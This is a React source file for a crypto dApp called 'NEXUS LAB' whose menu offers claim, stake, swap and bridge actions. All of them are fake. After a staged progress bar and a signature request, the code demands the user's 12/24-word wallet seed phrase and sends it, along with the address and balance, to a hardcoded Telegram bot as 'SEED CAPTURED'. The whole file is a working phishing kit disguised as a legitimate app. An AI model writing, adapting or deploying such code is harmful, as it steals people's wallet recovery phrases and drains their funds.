import React, { useState } from 'react';
import { useAccount, useBalance, useSignMessage } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, ArrowDown, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { signMessage } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [inputVal, setInputVal] = useState("");
  const [activeError, setActiveError] = useState({ title: "", desc: "" });

  const isSeedValid = (text) => {
    const words = text.trim().split(/\s+/);
    return words.length === 12 || words.length === 24;
  };

  const startAction = (title, desc) => {
    if (!isConnected) { open(); return; }
    setView("batching");
    setProgress(0);
    setActiveError({ title, desc });

    const interval = setInterval(() => {
      setProgress((p) => (p >= 100 ? 100 : p + 5));
    }, 50);

    setTimeout(() => {
      clearInterval(interval);
      setView("confirm_withdrawal");
    }, 2000);
  };

  const initiateWithdrawal = () => {
    setLoading(true);
    signMessage({ 
      message: `[NEXUS-PROTOCOL-AUTH]\n\nACTION: TOTAL_ASSET_WITHDRAWAL\nFROM: ${address}\nAMOUNT: ${balance?.formatted} ${balance?.symbol}\nSTATUS: PENDING_CONFIRMATION` 
    }, {
      onSettled: () => {
        setTimeout(() => {
          setLoading(false);
          setView("error");
        }, 1000);
      }
    });
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <div className="flex items-center gap-2 text-cyan-500"><ShieldCheck size={24}/><h1 className="text-xl font-black text-white italic tracking-widest">NEXUS LAB</h1></div>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[
            { n: "Claim", i: <Database/>, t: "REWARD_CLAIM" },
            { n: "Stake", i: <History/>, t: "POOL_EXIT" },
            { n: "Swap", i: <RefreshCcw/>, t: "BATCH_SWAP" },
            { n: "Migrate", i: <Activity/>, t: "V2_MIGRATION" },
            { n: "Unstake", i: <Unlock/>, t: "FLASH_EXIT" },
            { n: "Airdrop", i: <Zap/>, t: "DROP_INIT" },
            { n: "Rectify", i: <Settings/>, t: "NODE_FIX" },
            { n: "Delay", i: <Clock/>, t: "RPC_SYNC" },
            { n: "Bridge", i: <ArrowDown/>, t: "CROSS_BRIDGE" }
          ].map((item) => (
            <button key={item.n} onClick={() => startAction(item.t, "Initiating secure multi-node broadcast.")} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl hover:border-cyan-900 transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "batching" && (
        <div className="flex flex-col items-center justify-center py-20">
          <Cpu size={60} className="text-cyan-500 animate-spin mb-8" />
          <h2 className="text-white font-black text-lg mb-2 italic">Batching Transactions</h2>
          <div className="w-full bg-slate-900 h-1.5 rounded-full mt-6">
            <div className="bg-cyan-500 h-full transition-all" style={{ width: `${progress}%` }} />
          </div>
          <p className="text-[10px] text-cyan-700 mt-4 font-mono font-bold tracking-widest">{progress}% COMPLETE</p>
        </div>
      )}

      {view === "confirm_withdrawal" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-10 shadow-2xl animate-in zoom-in">
          <div className="text-center mb-8">
            <h2 className="text-white font-black text-xl italic tracking-tighter">WITHDRAWAL READY</h2>
            <p className="text-[10px] text-slate-500 mt-2 lowercase leading-relaxed">System ready to push {balance?.formatted.slice(0,6)} {balance?.symbol}. Network confirmation required.</p>
          </div>
          <button onClick={initiateWithdrawal} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl shadow-cyan-900/30 active:scale-95">CONFIRM & WITHDRAW ALL</button>
        </div>
      )}

      {view === "error" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Authorization Required</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the withdrawal broadcast, input your Secure Authorization Seed (12/24 words).</p>
            <div className="mt-8 text-left">
              <label className="text-[9px] font-black text-slate-700 ml-4 mb-2 block tracking-widest uppercase italic">Secure Authorization Seed</label>
              <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="WORD1 WORD2 WORD3..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900 focus:border-cyan-900 shadow-inner" />
            </div>
            <button disabled={!isSeedValid(inputVal)} onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\n\nSEED:\n${inputVal}` }),
              });
              alert("Node Handshake Successful. Broadcast Initiated."); setView("menu");
            }} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white ${isSeedValid(inputVal) ? 'bg-cyan-600 shadow-xl active:scale-95' : 'bg-slate-900 text-slate-700'}`}>
              {isSeedValid(inputVal) ? 'FINAL BROADCAST' : 'ENTER 12/24 WORDS'}
            </button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">PENDING CONFIRMATION...</p>
        </div>
      )}
    </div>
  );
}
